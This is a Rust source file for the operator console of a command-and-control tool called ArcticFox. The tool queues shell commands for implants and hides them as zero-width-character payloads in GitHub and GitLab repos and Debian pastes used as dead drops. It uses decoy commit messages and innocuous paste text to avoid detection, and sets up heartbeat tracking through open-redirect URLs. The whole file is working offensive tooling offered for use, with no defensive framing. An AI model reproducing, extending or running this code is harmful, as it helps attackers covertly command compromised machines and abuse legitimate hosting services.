//! ArcticFox C3 Control — Operator CLI for managing dead-drop C2 repos.
//!
//! Interactive shell + CLI mode for:
//! - Adding/removing repos (GitHub, GitLab, Debian paste)
//! - Pushing ZW-encoded command payloads
//! - Pulling and decoding payloads
//! - Heartbeat configuration
//! - Token management

use clap::Parser;
use std::io::{self, BufRead, Write};
use std::path::PathBuf;
use tracing::info;
use tracing_subscriber::EnvFilter;

use arcticfox_core::config::ControlConfig;
use arcticfox_core::error::{ArcticFoxError, Result};
use arcticfox_core::repo;

/// ArcticFox C3 Control — Operator Tool
#[derive(Parser)]
#[command(name = "arcticfox-control", version, about)]
struct Cli {
    /// Path to control config
    #[arg(long, default_value = "control_config.json")]
    config: PathBuf,

    /// Push payload to all alive repos and exit
    #[arg(long)]
    push: bool,

    /// Add a command (use with --push)
    #[arg(long)]
    cmd: Option<String>,

    /// Enable padding on push
    #[arg(long)]
    pad: bool,

    /// Check all repos and exit
    #[arg(long)]
    check: bool,
}

const BANNER: &str = "\x1b[1;36m
  ╔═══════════════════════════════════════════════════╗
  ║  ArcticFox Control — Zero-Width Dead-Drop Manager ║
  ╚═══════════════════════════════════════════════════╝
\x1b[0m";

const HELP_TEXT: &str = "\x1b[1mRepo Management:\x1b[0m
  \x1b[32madd <[gh:|gl:|dp:]owner/repo[:branch]>\x1b[0m — Add target (dp: = Debian paste)
  \x1b[32mrm <index>\x1b[0m                          — Remove repo by index
  \x1b[32mrepos\x1b[0m                               — List all repos
  \x1b[32mcheck\x1b[0m                               — Check repos for 404

\x1b[1mCommands:\x1b[0m
  \x1b[32mcmd <command>\x1b[0m                       — Add command to payload
  \x1b[32mcmds\x1b[0m                                — List current commands
  \x1b[32mrm_cmd <index>\x1b[0m                      — Remove command by index
  \x1b[32mclear\x1b[0m                               — Clear all commands

\x1b[1mHeartbeat:\x1b[0m
  \x1b[32mhb_redirect <url_with_{target}>\x1b[0m    — Set open redirect URL
  \x1b[32mhb_tracking <url_with_{id}>\x1b[0m       — Set tracking endpoint
  \x1b[32mhb_interval <seconds>\x1b[0m               — Set heartbeat interval
  \x1b[32mhb\x1b[0m                                  — Show heartbeat config

\x1b[1mTokens:\x1b[0m
  \x1b[32mgh_token <token>\x1b[0m                    — Set GitHub token
  \x1b[32mgl_token <token>\x1b[0m                    — Set GitLab token

\x1b[1mOperations:\x1b[0m
  \x1b[32mpush\x1b[0m                                — Push payload to all repos
  \x1b[32mpush <index>\x1b[0m                        — Push to specific repo
  \x1b[32mpad\x1b[0m                                 — Toggle 1MB ZW padding
  \x1b[32mpull <index>\x1b[0m                        — Read payload from repo
  \x1b[32mpreview\x1b[0m                             — Show payload JSON
  \x1b[32mpaste\x1b[0m                               — Create new Debian paste with payload
  \x1b[32msave\x1b[0m                                — Save config to disk

\x1b[1mOther:\x1b[0m
  \x1b[32mstatus\x1b[0m                              — Quick summary of config
  \x1b[32mhelp\x1b[0m                                — This help
  \x1b[32mexit\x1b[0m                                — Quit
";

const BLAND_COMMITS: &[&str] = &[
    "Update README.md",
    "docs: update readme",
    "fix typo in readme",
    "docs: minor update",
    "update documentation",
    "readme: fix formatting",
    "docs: clarify instructions",
    "update project description",
];

use rand::Rng;

fn random_commit_msg() -> &'static str {
    BLAND_COMMITS[rand::thread_rng().gen_range(0..BLAND_COMMITS.len())]
}

#[tokio::main]
async fn main() {
    let cli = Cli::parse();

    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::new("arcticfox_control=info"))
        .with_target(false)
        .init();

    let mut config = match ControlConfig::load(&cli.config) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("Error loading config: {e}");
            std::process::exit(1);
        }
    };

    // CLI mode: quick operations
    if cli.push {
        if let Some(cmd) = &cli.cmd {
            config.commands.push(cmd.clone());
        }
        if config.repos.is_empty() {
            eprintln!("No repos configured. Use interactive mode to add repos first.");
            std::process::exit(1);
        }
        let client = match repo::build_client() {
            Ok(c) => c,
            Err(e) => {
                eprintln!("Failed to build HTTP client: {e}");
                std::process::exit(1);
            }
        };
        let payload = repo::build_payload(&config);
        let alive: Vec<_> = config.repos.iter().filter(|r| r.alive).collect();
        if alive.is_empty() {
            eprintln!("No alive repos. Run --check first.");
            std::process::exit(1);
        }
        for r in alive {
            match repo::push_to_repo(r, &config, &payload, cli.pad, &client).await {
                Ok(true) => println!("  Pushed to {}", r.label()),
                Ok(false) => eprintln!("  Failed to push to {}", r.label()),
                Err(e) => eprintln!("  Error pushing to {}: {}", r.label(), e),
            }
        }
        return;
    }

    if cli.check {
        let client = match repo::build_client() {
            Ok(c) => c,
            Err(e) => {
                eprintln!("Failed to build HTTP client: {e}");
                std::process::exit(1);
            }
        };
        println!("Checking {} repos...", config.repos.len());
        for r in &mut config.repos {
            let alive = repo::check_repo_alive(r, &client).await;
            r.alive = alive;
            let status = if alive { "\x1b[32mALIVE\x1b[0m" } else { "\x1b[31m404/DEAD\x1b[0m" };
            println!("  {} — {}", r.label(), status);
        }
        if let Err(e) = config.save(&cli.config) {
            eprintln!("Warning: could not save config: {e}");
        }
        return;
    }

    // Interactive mode
    interactive_shell(config, cli.config).await;
}

async fn interactive_shell(mut config: ControlConfig, config_path: PathBuf) {
    println!("{}", BANNER);
    println!("{}", HELP_TEXT);

    let client = match repo::build_client() {
        Ok(c) => c,
        Err(e) => {
            eprintln!("Failed to build HTTP client: {e}");
            return;
        }
    };

    let mut use_pad = false;
    let stdin = io::stdin();

    loop {
        print!("\x1b[1mctrl>\x1b[0m ");
        io::stdout().flush().ok();

        let mut line = String::new();
        match stdin.lock().read_line(&mut line) {
            Ok(0) => break, // EOF
            Ok(_) => {}
            Err(_) => break,
        }

        let line = line.trim().to_string();
        if line.is_empty() {
            continue;
        }

        let mut parts = line.splitn(2, ' ');
        let action = parts.next().unwrap_or("").to_lowercase();
        let arg = parts.next().unwrap_or("").to_string();

        match action.as_str() {
            "help" => println!("{}", HELP_TEXT),
            "exit" | "quit" => break,

            "add" => {
                if arg.is_empty() {
                    println!("  \x1b[31mUsage: add [gh:|gl:|dp:]owner/repo\x1b[0m");
                    continue;
                }
                match repo::parse_repo_spec(&arg) {
                    Ok(r) => {
                        let label = r.label();
                        config.repos.push(r);
                        println!("  \x1b[32m+ {}\x1b[0m", label);
                    }
                    Err(e) => println!("  \x1b[31m{}\x1b[0m", e),
                }
            }

            "rm" => {
                match arg.parse::<usize>() {
                    Ok(idx) if idx > 0 && idx <= config.repos.len() => {
                        let removed = config.repos.remove(idx - 1);
                        println!("  \x1b[33m- {}\x1b[0m", removed.label());
                    }
                    _ => println!("  \x1b[31mInvalid index\x1b[0m"),
                }
            }

            "repos" => {
                if config.repos.is_empty() {
                    println!("  \x1b[2m(no repos)\x1b[0m");
                } else {
                    for (i, r) in config.repos.iter().enumerate() {
                        let status = if r.alive {
                            "\x1b[32mOK\x1b[0m"
                        } else {
                            "\x1b[31m404\x1b[0m"
                        };
                        if r.platform == "debian" {
                            println!("  {}. [debian] paste:{} {}", i + 1, r.repo, status);
                        } else {
                            println!(
                                "  {}. [{}] {}/{}:{}/{} {}",
                                i + 1, r.platform, r.owner, r.repo, r.branch, r.file_path, status
                            );
                        }
                    }
                }
            }

            "check" => {
                println!("  Checking {} repos...", config.repos.len());
                for r in &mut config.repos {
                    let alive = repo::check_repo_alive(r, &client).await;
                    r.alive = alive;
                    let status = if alive {
                        "\x1b[32mALIVE\x1b[0m"
                    } else {
                        "\x1b[31m404/DEAD\x1b[0m"
                    };
                    println!("    {} — {}", r.label(), status);
                }
            }

            "cmd" => {
                if arg.is_empty() {
                    println!("  \x1b[31mUsage: cmd <command>\x1b[0m");
                    continue;
                }
                config.commands.push(arg);
                println!("  \x1b[2m+ added ({} total)\x1b[0m", config.commands.len());
            }

            "cmds" => {
                if config.commands.is_empty() {
                    println!("  \x1b[2m(no commands)\x1b[0m");
                } else {
                    for (i, cmd) in config.commands.iter().enumerate() {
                        println!("  {}. {}", i + 1, cmd);
                    }
                }
            }

            "rm_cmd" => {
                match arg.parse::<usize>() {
                    Ok(idx) if idx > 0 && idx <= config.commands.len() => {
                        let removed = config.commands.remove(idx - 1);
                        println!("  \x1b[33m- {}\x1b[0m", removed);
                    }
                    _ => println!("  \x1b[31mInvalid index\x1b[0m"),
                }
            }

            "clear" => {
                config.commands.clear();
                println!("  \x1b[2mCommands cleared\x1b[0m");
            }

            "hb_redirect" => {
                config.heartbeat_redirect = arg;
                println!("  \x1b[32mRedirect: {}\x1b[0m", config.heartbeat_redirect);
            }

            "hb_tracking" => {
                config.heartbeat_tracking = arg;
                println!("  \x1b[32mTracking: {}\x1b[0m", config.heartbeat_tracking);
            }

            "hb_interval" => {
                match arg.parse::<u64>() {
                    Ok(secs) if secs >= 30 => {
                        config.heartbeat_interval = secs;
                        println!("  \x1b[32mInterval: {}s\x1b[0m", secs);
                    }
                    Ok(_) => println!("  \x1b[31mInterval must be >= 30 seconds\x1b[0m"),
                    Err(_) => println!("  \x1b[31mInvalid seconds value\x1b[0m"),
                }
            }

            "hb" => {
                println!("  Redirect URL:  {}", config.heartbeat_redirect);
                println!("  Tracking URL:  {}", config.heartbeat_tracking);
                println!("  Interval:       {}s", config.heartbeat_interval);
            }

            "gh_token" => {
                config.github_token = arg;
                println!("  \x1b[32mGitHub token set\x1b[0m");
            }

            "gl_token" => {
                config.gitlab_token = arg;
                println!("  \x1b[32mGitLab token set\x1b[0m");
            }

            "push" => {
                let payload = repo::build_payload(&config);
                let results = if let Ok(idx) = arg.parse::<usize>() {
                    if idx == 0 || idx > config.repos.len() {
                        println!("  \x1b[31mInvalid index\x1b[0m");
                        continue;
                    }
                    let r = &config.repos[idx - 1];
                    vec![(
                        r.label(),
                        repo::push_to_repo(r, &config, &payload, use_pad, &client).await,
                    )]
                } else {
                    let alive: Vec<_> = config.repos.iter().filter(|r| r.alive).collect();
                    if alive.is_empty() {
                        println!("  \x1b[31mNo alive repos. Run check first.\x1b[0m");
                        continue;
                    }
                    let mut results = Vec::new();
                    for r in alive {
                        results.push((
                            r.label(),
                            repo::push_to_repo(r, &config, &payload, use_pad, &client).await,
                        ));
                    }
                    results
                };

                println!("  Payload size: {} bytes (pad: {})", payload.len(), use_pad);
                for (label, result) in &results {
                    match result {
                        Ok(true) => println!("    \x1b[32m✓\x1b[0m {}", label),
                        Ok(false) => println!("    \x1b[31m✗\x1b[0m {} (push returned false)", label),
                        Err(e) => println!("    \x1b[31m✗\x1b[0m {} ({})", label, e),
                    }
                }
            }

            "pad" => {
                use_pad = !use_pad;
                println!("  Padding: {}", if use_pad { "\x1b[32mON\x1b[0m" } else { "\x1b[31mOFF\x1b[0m" });
            }

            "pull" => {
                match arg.parse::<usize>() {
                    Ok(idx) if idx > 0 && idx <= config.repos.len() => {
                        let r = &config.repos[idx - 1];
                        println!("  Pulling from {}...", r.label());
                        match repo::pull_from_repo(r, &config, &client).await {
                            Ok(Some(payload)) => {
                                println!("{}", serde_json::to_string_pretty(&payload).unwrap_or_default());
                            }
                            Ok(None) => println!("  \x1b[33mNo payload found\x1b[0m"),
                            Err(e) => println!("  \x1b[31mError: {}\x1b[0m", e),
                        }
                    }
                    _ => println!("  \x1b[31mInvalid index\x1b[0m"),
                }
            }

            "preview" => {
                let payload = repo::build_payload(&config);
                let decoded: serde_json::Value =
                    serde_json::from_slice(&payload).unwrap_or_default();
                println!(
                    "{}",
                    serde_json::to_string_pretty(&decoded).unwrap_or_default()
                );
                println!(
                    "  \x1b[2m{} bytes, {} ZW chars\x1b[0m",
                    payload.len(),
                    payload.len() * 4
                );
            }

            "paste" => {
                let payload = repo::build_payload(&config);
                let content = "# Notes\n\nMiscellaneous.\n";
                match arcticfox_core::zwcodec::inject(content, &payload, use_pad) {
                    Ok(injected) => match repo::DebianPaste::create(&injected, &client).await {
                        Ok(paste_id) => {
                            config.repos.push(arcticfox_core::config::RepoTarget {
                                owner: String::new(),
                                repo: paste_id.clone(),
                                platform: "debian".into(),
                                branch: String::new(),
                                file_path: String::new(),
                                alive: true,
                            });
                            println!("  \x1b[32mPaste created: https://paste.debian.net/{}\x1b[0m", paste_id);
                        }
                        Err(e) => println!("  \x1b[31mFailed: {}\x1b[0m", e),
                    },
                    Err(e) => println!("  \x1b[31mInject error: {}\x1b[0m", e),
                }
            }

            "save" => {
                match config.save(&config_path) {
                    Ok(()) => println!("  \x1b[32mConfig saved\x1b[0m"),
                    Err(e) => println!("  \x1b[31mSave failed: {}\x1b[0m", e),
                }
            }

            "status" => {
                let alive_repos = config.repos.iter().filter(|r| r.alive).count();
                println!("  Repos:    {} total, {} alive", config.repos.len(), alive_repos);
                println!("  Commands: {} queued", config.commands.len());
                println!(
                    "  GH token: {}",
                    if config.github_token.is_empty() {
                        "\x1b[31mnot set\x1b[0m"
                    } else {
                        "\x1b[32mset\x1b[0m"
                    }
                );
                println!(
                    "  GL token: {}",
                    if config.gitlab_token.is_empty() {
                        "\x1b[31mnot set\x1b[0m"
                    } else {
                        "\x1b[32mset\x1b[0m"
                    }
                );
                println!("  Padding:  {}", if use_pad { "ON" } else { "OFF" });
                println!(
                    "  Heartbeat: {}s ({})",
                    config.heartbeat_interval,
                    if config.heartbeat_redirect.is_empty() {
                        "not configured"
                    } else {
                        "configured"
                    }
                );
            }

            _ => println!("  \x1b[31mUnknown command. Type 'help'.\x1b[0m"),
        }
    }

    println!("\n\x1b[33m[*] Exiting...\x1b[0m");
    if let Err(e) = config.save(&config_path) {
        eprintln!("Warning: could not save config on exit: {e}");
    }
}
